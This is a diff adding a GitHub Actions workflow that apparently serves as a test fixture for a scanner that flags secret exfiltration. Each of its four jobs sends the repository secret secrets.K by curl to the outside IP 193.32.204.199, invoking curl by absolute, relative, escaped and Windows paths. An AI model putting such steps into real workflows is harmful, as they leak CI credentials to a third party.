@@ -1,0 +1,24 @@
+name: violation_client_by_path
+on: push
+jobs:
+  abs:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          /usr/bin/curl -d "k=${{ secrets.K }}" http://193.32.204.199
+  rel:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          ./curl -d "k=${{ secrets.K }}" http://193.32.204.199
+  escaped:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          \curl -d "k=${{ secrets.K }}" http://193.32.204.199
+  winpath:
+    runs-on: windows-latest
+    steps:
+      - shell: pwsh
+        run: |
+          C:\tools\curl.exe -d "k=${{ secrets.K }}" http://193.32.204.199
